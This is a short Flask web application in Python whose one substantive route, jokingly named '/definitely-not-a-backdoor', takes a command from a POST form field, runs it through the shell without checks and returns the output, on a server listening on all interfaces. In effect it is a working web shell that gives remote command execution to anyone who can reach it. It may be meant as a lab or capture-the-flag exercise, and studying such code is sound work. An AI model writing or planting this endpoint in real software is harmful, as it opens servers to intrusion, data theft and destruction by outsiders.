from flask import *
import subprocess

app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')

@app.route('/definitely-not-a-backdoor', methods=['POST'])
def backdoor():
    cmd = request.form.get('definitely-not-a-command')
    if cmd is None:
        return 'error: no command sent!'
    p = subprocess.run(cmd, shell=True, capture_output=True)
    return p.stdout.decode('ascii')

if __name__ == '__main__':
    app.run(host='0.0.0.0')
